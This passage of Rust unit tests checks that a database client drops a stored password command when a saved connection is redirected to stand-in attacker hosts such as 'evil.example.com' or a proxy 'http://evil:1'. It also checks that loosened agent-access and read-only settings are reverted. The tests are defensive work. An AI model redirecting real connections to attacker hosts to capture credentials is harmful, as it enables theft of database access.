        before.ssl_mode = SslMode::VerifyFull;
        // Only the name and the color change: nothing to guard.
        let mut same = before.clone();
        same.name = "Renamed".to_owned();
        same.color = Some("#ff0000".to_owned());
        assert_eq!(guard(&before, &mut same), Guarded::default());
        assert!(same.password_command.is_some());
        let moved = |change: &dyn Fn(&mut SavedConnection)| {
            let mut after = before.clone();
            change(&mut after);
            let g = guard(&before, &mut after);
            (g, after)
        };
        for change in [
            &(|c: &mut SavedConnection| c.host = "evil.example.com".to_owned())
                as &dyn Fn(&mut SavedConnection),
            &|c| c.port = Some(5433),
            &|c| c.database = "other".to_owned(),
            &|c| c.driver = DriverKind::MySql,
            &|c| c.ssh.as_mut().unwrap().host = "evil-bastion".to_owned(),
            &|c| c.ssh.as_mut().unwrap().port = 22,
            &|c| c.ssh.as_mut().unwrap().jump = None,
            &|c| c.ssh = None,
            &|c| c.ssl_mode = SslMode::Disable,
            &|c| {
                c.options
                    .insert("proxy".to_owned(), "http://evil:1".to_owned());
            },
        ] {
            let (g, after) = moved(change);
            assert!(g.retargeted, "{after:?}");
            assert!(after.password_command.is_none());
        }
        let (g, after) = moved(&|c| c.ssl_mode = SslMode::VerifyCa);
        assert!(g.retargeted, "a weaker SSL mode counts");
        assert!(after.password_command.is_none());
        let (g, after) = moved(&|c| {
            c.agent_access = AgentAccess::ReadWrite;
            c.read_only = false;
            c.restrictions = Restrictions::default();
            c.connection_type = Some(ConnectionType::Dev);
        });
        assert_eq!(
            g,
            Guarded {
                retargeted: false,
                kept_stricter: true
            }
        );
        assert_eq!(after.agent_access, AgentAccess::Off);
        assert!(after.read_only && after.restrictions.no_export);
        assert_eq!(after.connection_type, Some(ConnectionType::Prod));
        // Tightening is taken as it is.
        let mut open = before.clone();
        open.read_only = false;
        open.agent_access = AgentAccess::ReadWrite;
        let mut tighter = open.clone();
        tighter.read_only = true;
        tighter.agent_access = AgentAccess::ReadOnly;
        assert_eq!(guard(&open, &mut tighter), Guarded::default());
        assert!(tighter.read_only);
    }

    #[test]
    fn profiles_lose_their_keys_too() {
        let p = NetworkProfile {
            id: Uuid::new_v4(),
            name: "VPN".to_owned(),
            ssl_mode: SslMode::default(),
            ssl_root_cert: Some("/CANARY/r".into()),
            ssl_client_cert: Some("/CANARY/c".into()),
            ssl_client_key: Some("/CANARY/k".into()),
            ssh: leaky().ssh,
        };
        let text = serde_json::to_string(&ShareProfile::from_saved(&p, false)).unwrap();
        assert!(!text.contains("CANARY") && text.contains("bastion"));
    }
}
